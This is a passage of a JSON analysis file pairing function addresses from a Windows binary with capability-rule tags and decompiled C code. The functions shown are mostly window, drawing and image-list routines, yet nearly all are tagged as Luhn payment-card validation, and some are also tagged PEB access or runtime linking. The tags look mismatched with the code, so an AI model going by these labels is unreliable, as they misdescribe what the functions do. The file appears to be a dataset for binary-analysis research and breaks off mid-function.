        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00463ba4(int32_t param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t in_stack_fffffec4;\n    int16_t iStack300;\n    int16_t iStack298;\n    int32_t iStack296;\n    int32_t iStack292;\n    uchar auStack44 [4];\n    int32_t iStack40;\n    int32_t iStack36;\n    uint32_t uStack32;\n    uchar uStack28;\n    uint uStack24;\n    \n    sub.user32.dll_GetMessagePos();\n    uVar2 = fcn.0040766c();\n    iStack300 = uVar2;\n    iStack296 = iStack300;\n    iStack298 = uVar2 >> 0x10;\n    iStack292 = iStack298;\n    iStack36 = 0x463be0;\n    fcn.0045ea84();\n    if (param_1 == 0) {\n        iStack36 = 0;\n        in_stack_fffffec4 = 0;\n        param_1 = fcn.00463ae0(0, 0);\n    }\n    if (param_1 == 0) {\n        return 0;\n    }\n    iStack40 = in_stack_fffffec4;\n    if (in_EAX != param_1) {\n        iStack40 = in_stack_fffffec4 - *(param_1 + 0x40);\n        iStack36 = iStack36 - *(param_1 + 0x44);\n    }\n    uStack32 = *(param_2 + 8);\n    uStack24 = *(param_2 + 4);\n    uVar3 = *(param_2 + 10);\n    if (uVar3 < 0x201) {\n        if (uVar3 - 0xa1 < 2) {\ncode_r0x00463c85:\n            uStack28 = 0;\n            goto code_r0x00463cab;\n        }\n        if (uVar3 - 0xa4 < 2) {\ncode_r0x00463c99:\n            uStack28 = 1;\n            goto code_r0x00463cab;\n        }\n        uVar3 = uVar3 - 0xa7;\n    }\n    else {\n        if (uVar3 - 0x201 < 2) goto code_r0x00463c85;\n        if (uVar3 - 0x204 < 2) goto code_r0x00463c99;\n        uVar3 = uVar3 - 0x207;\n    }\n    if (uVar3 < 2) {\n        uStack28 = 2;\n    }\n    else {\n        uStack28 = 0;\n    }\ncode_r0x00463cab:\n    sub.user32.dll_GetKeyboardState(&stack0xfffffed8);\n    uVar1 = fcn.00471868();\n    uStack32._0_2_ = CONCAT11(uVar1, uStack32);\n    uStack32 = uStack32 & 0xffff0000 | uStack32;\n    uVar2 = fcn.004601fc(&stack0xffffffd4);\n    *(param_2 + 0xc) = uVar2;\n    return 1;\n}\n",
        "token_count": 745
    },
    "004643cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004643cc(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.0045b9a4();\n    if (iVar1 != 0) {\n        uVar2 = fcn.004601fc(*(param_2 + 8));\n        *(param_2 + 0xc) = uVar2;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 106
    },
    "00464878": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00464878(uint param_1, int32_t *param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    int32_t *arg_ch;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_18h;\n    uint nSavedDC;\n    int32_t *nLeftRect;\n    uint hdc;\n    \n    puStack36 = 0x46488d;\n    nLeftRect = param_2;\n    hdc = in_EAX;\n    nSavedDC = sub.gdi32.dll_SaveDC();\n    uStack40 = 0x46490e;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    sub.gdi32.dll_ExcludeClipRect(hdc, *nLeftRect + 2, nLeftRect[1] + 2, nLeftRect[2] + -2, nLeftRect[3] + -2);\n    fcn.00452050();\n    fcn.004522c0();\n    arg_8h = 0;\n    arg_ch = nLeftRect;\n    fcn.00452050();\n    fcn.00452214(arg_8h, arg_ch);\n    *in_FS_OFFSET = arg_8h;\n    sub.gdi32.dll_RestoreDC(hdc, nSavedDC, 0x464915);\n    return;\n}\n",
        "token_count": 329
    },
    "00465598": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00465598(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040483c();\n    fcn.0040483c(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 76
    },
    "00466684": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00466684(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_3ch;\n    uint var_2ch;\n    uint var_10h;\n    \n    if ((((in_EDX == in_EAX[0x10]) && (in_ECX == in_EAX[0x11])) && (arg_ch == in_EAX[0x12])) && (arg_8h == in_EAX[0x13])\n       ) {\n        return;\n    }\n    cVar1 = fcn.00466fb4();\n    if ((cVar1 == '\\0') || (iVar2 = sub.user32.dll_IsIconic(in_EAX[0x6d]),  iVar2 != 0)) {\n        in_EAX[0x10] = in_EDX;\n        in_EAX[0x11] = in_ECX;\n        in_EAX[0x12] = arg_ch;\n        in_EAX[0x13] = arg_8h;\n        cVar1 = fcn.00466fb4();\n        if (cVar1 != '\\0') {\n            var_2ch = 0x2c;\n            sub.user32.dll_GetWindowPlacement(in_EAX[0x6d], &var_2ch);\n            fcn.0045e864();\n            sub.user32.dll_SetWindowPlacement();\n        }\n    }\n    else {\n        sub.user32.dll_SetWindowPos(in_EAX[0x6d], 0);\n    }\n    fcn.0045e450();\n    fcn.00461adc();\n    (**(*in_EAX + 0x5c))();\n    return;\n}\n",
        "token_count": 399
    },
    "00466760": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00466760(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00462d98(param_2, param_1);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00462d5c();\n            fcn.0040483c();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00466bac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00466bac(void)\n\n{\n    int32_t in_EAX;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar auStack20 [16];\n    \n    puStack32 = &stack0xffffffec;\n    uStack24 = 0x466bbb;\n    fcn.0045e864();\n    uStack24 = 1;\n    uStack28 = 1;\n    sub.user32.dll_InflateRect();\n    sub.user32.dll_InvalidateRect(*(*(in_EAX + 0x30) + 0x1b4), &stack0xffffffe0, 0xffffffff);\n    return;\n}\n",
        "token_count": 145
    },
    "00466fc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00466fc0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iStack116;\n    uchar *puStack112;\n    int32_t iStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack60;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    uStack76 = *(in_EAX + 0x1b4);\n    puStack80 = 0x466fd4;\n    iVar1 = sub.user32.dll_IsIconic();\n    if (iVar1 == 0) {\n        uStack84 = *(in_EAX + 0x1b4);\n        uStack88 = 0x46700a;\n        puStack80 = &stack0xffffffb4;\n        sub.user32.dll_GetWindowRect();\n    }\n    else {\n        uStack60 = 0x2c;\n        puStack80 = &stack0xffffffc4;\n        uStack84 = *(in_EAX + 0x1b4);\n        uStack88 = 0x466ff1;\n        sub.user32.dll_GetWindowPlacement();\n        uStack84 = uStack40;\n        puStack80 = puStack36;\n        uStack76 = uStack32;\n        uStack72 = uStack28;\n    }\n    uStack88 = 0xfffffff0;\n    uStack92 = *(in_EAX + 0x1b4);\n    uStack96 = 0x467018;\n    uVar2 = sub.user32.dll_GetWindowLongA();\n    if ((uVar2 & 0x40000000) != 0) {\n        uStack96 = 0xfffffff8;\n        uStack100 = *(in_EAX + 0x1b4);\n        puStack104 = 0x46702d;\n        iVar1 = sub.user32.dll_GetWindowLongA();\n        if (iVar1 != 0) {\n            sub.user32.dll_ScreenToClient();\n            sub.user32.dll_ScreenToClient();\n            iStack116 = iVar1;\n            puStack112 = &stack0xffffff9c;\n            iStack108 = iVar1;\n            puStack104 = &stack0xffffff9c;\n        }\n    }\n    *(in_EAX + 0x40) = iStack116;\n    *(in_EAX + 0x44) = puStack112;\n    *(in_EAX + 0x48) = iStack108 - iStack116;\n    *(in_EAX + 0x4c) = puStack104 - puStack112;\n    fcn.0045e450();\n    return;\n}\n",
        "token_count": 636
    },
    "00467210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00467210(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00462d98();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.00462d5c();\n            if (*(iVar2 + 4) == in_EDX) {\n                (*arg_8h)();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "00468264": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00468264(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    uStack16 = 0x468275;\n    var_4h = in_EAX;\n    uStack16 = fcn.00466ca8();\n    puStack20 = 0x46827b;\n    var_8h = sub.user32.dll_GetWindowDC();\n    uStack24 = 0x4682ba;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    (**(*var_4h + 0xdc))();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4682c1;\n    uStack24 = var_8h;\n    uStack28 = 0x4682b3;\n    uStack28 = fcn.00466ca8();\n    sub.user32.dll_ReleaseDC();\n    return;\n}\n",
        "token_count": 260
    },
    "004682c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004682c8(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x468361;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    (**(*in_EAX + 0x44))();\n    var_10h = var_10h + 2;\n    var_ch = var_ch + 2;\n    fcn.00427b48();\n    uVar1 = fcn.0046188c();\n    fcn.0045ef44(0xffffffff, &var_10h, uVar1 | 0x810);\n    uVar2 = fcn.004058fc();\n    uVar2 = fcn.00428b60(uVar2);\n    sub.user32.dll_DrawTextA();\n    *in_FS_OFFSET = uVar2;\n    fcn.0040546c(0x468368);\n    return;\n}\n",
        "token_count": 279
    },
    "0046866c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046866c(void)\n\n{\n    int32_t *in_EAX;\n    uint var_10h;\n    \n    (**(*in_EAX + 0xe0))();\n    return;\n}\n",
        "token_count": 46
    },
    "00468694": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00468694(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    fcn.004181c0(arg_8h, 0);\n    uVar1 = fcn.0046188c();\n    uVar2 = fcn.004058fc(0xffffffff, arg_8h, uVar1 | 0xc10);\n    uVar2 = fcn.00428b60(uVar2);\n    sub.user32.dll_DrawTextA(uVar2);\n    *(arg_8h + 8) = *(arg_8h + 8) + 6;\n    *(arg_8h + 0xc) = *(arg_8h + 0xc) + 2;\n    return;\n}\n",
        "token_count": 181
    },
    "00468784": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00468784(int32_t *arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t lpRect;\n    int32_t var_14h;\n    uint lpPoint;\n    uint var_4h;\n    \n    sub.user32.dll_ClientToScreen();\n    sub.user32.dll_GetWindowRect();\n    *arg_8h = in_EDX - lpRect;\n    arg_8h[1] = in_ECX - var_14h;\n    return;\n}\n",
        "token_count": 119
    },
    "00468b8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00468b8c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x1c) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "0046a064": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046a064(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t in_EDX;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.004181c0(&var_1ch, *(*(arg_8h + -4) + 0x18) + in_EDX + -2);\n    fcn.00452050();\n    cVar1 = fcn.00452158();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.00428b60(&var_1ch, 1, 0);\n        sub.user32.dll_DrawFrameControl(uVar2);\n    }\n    else {\n        fcn.00452050();\n        fcn.00452398();\n        arg_ch = &var_1ch;\n        arg_8h_00 = 0;\n        uVar2 = fcn.00428b60();\n        fcn.00452050(uVar2);\n        fcn.00452214(arg_8h_00, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 262
    },
    "0046a180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046a180(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint arg_8h_00;\n    uint *arg_ch_00;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.004181c0(&var_1ch, arg_8h);\n    fcn.00452050();\n    fcn.004522fc();\n    arg_ch_00 = &var_1ch;\n    arg_8h_00 = 0;\n    uVar1 = fcn.00428b60();\n    fcn.00452050(uVar1);\n    fcn.00452214(arg_8h_00, arg_ch_00);\n    return;\n}\n",
        "token_count": 169
    },
    "0046aebc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046aebc(uint *param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    uVar1 = *param_1;\n    uVar2 = param_1[1];\n    *(in_EAX + 0x60) = param_2;\n    fcn.00466ca8(uVar1, uVar2);\n    fcn.0046bcec();\n    uVar1 = fcn.00466ca8();\n    *(in_EAX + 0x5c) = uVar1;\n    uVar3 = 0;\n    uVar2 = sub.user32.dll_GetDCEx(uVar1, 0, 0x412);\n    *(in_EAX + 0x58) = uVar2;\n    *(in_EAX + 0x50) = uVar1;\n    *(in_EAX + 0x54) = uVar3;\n    fcn.0046afe4();\n    return;\n}\n",
        "token_count": 236
    },
    "0046b160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0046b160(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*(param_2 + 0xc) == 0) {\n        var_8h = fcn.00469108();\n        iVar1 = fcn.00468c68();\n        var_8h = var_8h + iVar1;\n    }\n    else {\n        var_8h = fcn.00469108();\n    }\n    fcn.0046b0d0(&stack0xfffffffc);\n    return var_8h;\n}\n",
        "token_count": 149
    },
    "0046b1b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0046b1b0(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar2 = 4;\n    if (param_2 != 0) {\n        fcn.0045e864();\n        fcn.0045e864();\n        if (((var_1ch < var_ch) || (var_14h <= var_4h)) || (var_8h < var_18h)) {\n            if (((var_20h < var_10h) || (var_18h <= var_8h)) || (var_4h < var_14h)) {\n                iVar1 = var_1ch + var_14h >> 1;\n                if (iVar1 < 0) {\n                    iVar1 = iVar1 + ((var_1ch + var_14h & 1U) != 0);\n                }\n                if (iVar1 <= var_ch) {\n                    uVar2 = 2;\n                }\n            }\n            else {\n                uVar2 = 3;\n            }\n        }\n        else {\n            uVar2 = 1;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 335
    },
    "0046b3e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046b3e4(char param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0046945c();\n    if (iVar1 == 0) {\n        if (param_1 != '\\0') {\n            fcn.00418198();\n            iVar1 = fcn.00469c40();\n            if (iVar1 == 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = *(iVar1 + 4);\n            }\n            fcn.0046b1b0(uVar2);\n            (**(*in_EAX + 0xc))();\n        }\n    }\n    else {\n        if (param_1 == '\\0') {\n            fcn.0046b22c(&stack0xfffffffc);\n        }\n        else {\n            fcn.0046b2ac(&stack0xfffffffc);\n        }\n        (**(*in_EAX[5] + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 256
    },
    "0046b704": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046b704(uint param_1, uint param_2)\n\n{\n    fcn.00403440(param_2, param_1);\n    return;\n}\n",
        "token_count": 41
    },
    "0046b734": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0046b734(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iStack12;\n    \n    if (param_1 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.00403440(param_2);\n        iStack12 = param_1;\n    }\n    return CONCAT44(iStack12, uVar1);\n}\n",
        "token_count": 102
    },
    "0046ba50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046ba50(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_EAX;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x46bb31;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    iVar4 = (**(*in_EAX + 8))();\n    if (var_10h == 0x12) {\n        fcn.0040546c();\n    }\n    else if ((iVar4 != 0) && ((var_10h == 2 || (var_10h == 0x14)))) {\n        fcn.0045e864();\n        (***in_EAX)();\n        iVar2 = *(iVar4 + 0x40) * 2 - var_20h;\n        iVar3 = *(iVar4 + 0x44) * 2 - var_1ch;\n        iVar1 = *(iVar4 + 0x48);\n        iVar4 = *(iVar4 + 0x4c);\n        fcn.0045ef44();\n        fcn.004054c0();\n        *in_ECX = iVar2;\n        in_ECX[1] = iVar3;\n        in_ECX[2] = iVar1 * -2 + var_18h * 3 + iVar2 * -2;\n        in_ECX[3] = iVar4 * -2 + var_14h * 3 + iVar3 * -2;\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x46bb38;\n    uStack60 = 0x46bb30;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 502
    },
    "0046c190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0046c190(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    uint *puVar3;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_10h = 0;\n    var_4h = 0;\n    uStack48 = 0x46c308;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack52;\n    puVar3 = &var_4h;\n    var_ch = sub.kernel32.dll_GetCurrentProcessId();\n    var_8h._0_1_ = 0;\n    fcn.0040ae94(puVar3);\n    fcn.004054c0();\n    uVar1 = fcn.004058fc();\n    *0x4aaff8 = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    puVar3 = &var_10h;\n    sub.kernel32.dll_GetCurrentThreadId_1();\n    fcn.0040ae94(puVar3);\n    fcn.004054c0();\n    uVar1 = fcn.004058fc();\n    *0x4aaffa = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    uVar1 = fcn.004058fc();\n    *0x4ab004 = sub.user32.dll_RegisterWindowMessageA(uVar1);\n    *0x4ab03c = fcn.00419828();\n    fcn.0046bd98();\n    *0x4aafe4 = fcn.0046bb44();\n    uVar1 = fcn.00479730();\n    **0x4a514c = uVar1;\n    uVar1 = fcn.0047a938();\n    **0x4a4f48 = uVar1;\n    fcn.0047c974();\n    fcn.00418fd8();\n    iVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x46c344);\n    if (iVar2 != 0) {\n        *0x4a478c = sub.kernel32.dll_GetProcAddress_1(iVar2, 0x46c34c);\n        in_stack_ffffffac = iVar2;\n    }\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.0040546c(0x46c30f);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 626
    },
    "0046c35c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0046c35c(int32_t param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    in_EAX[1] = param_1;\n    (**(*in_EAX + 0x14))();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 181
    },
    "0046caa8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.0046caa8(void)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    uint arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint var_18h;\n    uint hdc;\n    int32_t var_4h;\n    \n    uStack36 = 0;\n    puStack40 = 0x46cab9;\n    var_4h = in_EAX;\n    hdc = sub.user32.dll_GetDC();\n    uStack44 = 0x46cb49;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    piVar1 = *(var_4h + 0x50);\n    puStack40 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateCompatibleBitmap(hdc, *(var_4h + 0x34), *(var_4h + 0x30));\n    fcn.0042ddc8();\n    fcn.0042d1b4();\n    fcn.00428404();\n    arg_ch = (**(*piVar1 + 0x20))();\n    arg_8h = &fcn.0046caa8::var_18h;\n    (**(*piVar1 + 0x2c))();\n    fcn.004181c0(arg_8h, arg_ch);\n    fcn.0042d1b4(&fcn.0046caa8::var_18h);\n    fcn.004287a8();\n    *in_FS_OFFSET = arg_8h;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x46cb50);\n    return;\n}\n",
        "token_count": 394
    },
    "0046cb6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046cb6c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = *(in_EAX + 0x34);\n    uStack12 = *(in_EAX + 0x30);\n    puVar1 = &uStack8;\n    sub.comctl32.dll_ImageList_GetIconSize(param_2, puVar1, &uStack12);\n    *(in_EAX + 0x34) = puVar1;\n    *(in_EAX + 0x30) = param_2;\n    fcn.0046caa8();\n    return;\n}\n",
        "token_count": 160
    },
    "0046cd0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046cd0c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x46cd27;\n    fcn.0042cbe0();\n    uStack36 = 0x46cdbb;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x46cd44;\n    puStack32 = &stack0xfffffffc;\n    fcn.0042cbe0();\n    uStack48 = 0x46cd9e;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.0046ca9c();\n    uVar1 = fcn.0046cbe0();\n    uVar2 = fcn.0046cbe0(uVar1);\n    uVar1 = *(in_EAX + 0x3c);\n    sub.comctl32.dll_ImageList_Add(uVar1, uVar2);\n    *in_FS_OFFSET = uVar1;\n    fcn.00404640(0x46cda5);\n    return;\n}\n",
        "token_count": 344
    },
    "0046d608": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0046d608(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 != NULL) {\n        puStack32 = 0x46d620;\n        iVar1 = fcn.0046cdd8();\n        puStack32 = 0x46d629;\n        iVar2 = fcn.0046cdd8();\n        if (iVar1 == iVar2) {\n            puStack32 = 0x46d63d;\n            iVar1 = fcn.0046cdd8();\n            if (iVar1 != 0) {\ncode_r0x0046d655:\n                puStack32 = 0x46d661;\n                fcn.00404610();\n                uStack36 = 0x46d6e4;\n                uStack40 = *in_FS_OFFSET;\n                